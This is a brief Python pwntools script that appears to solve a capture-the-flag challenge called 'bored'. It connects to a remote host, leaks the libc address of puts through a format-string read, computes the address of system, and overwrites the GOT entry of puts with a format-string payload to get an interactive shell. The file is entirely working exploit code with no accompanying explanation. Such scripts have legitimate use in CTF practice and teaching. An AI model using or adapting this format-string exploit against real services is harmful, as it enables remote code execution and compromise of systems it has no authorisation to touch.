from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"
context.arch = "amd64"

elf = ELF("./bored_patched")
# io = process("./bored_patched")
# io = gdb.debug("./bored_patched", "c")
io = remote("spclr.ch", 7331)
io.sendline(b"peko%7$s" + p64(elf.got["puts"]))
io.recvuntil(b"peko")
puts = int.from_bytes(io.recv(6), "little")
print(f"{puts = :#x}")
libc_base = puts - 0x875a0
print(f"{libc_base = :#x}")
system = libc_base + 0x55410
print(f"{system = :#x}")
payload = fmtstr_payload(6, {elf.got["puts"]: system})
io.sendline(payload)
io.interactive()
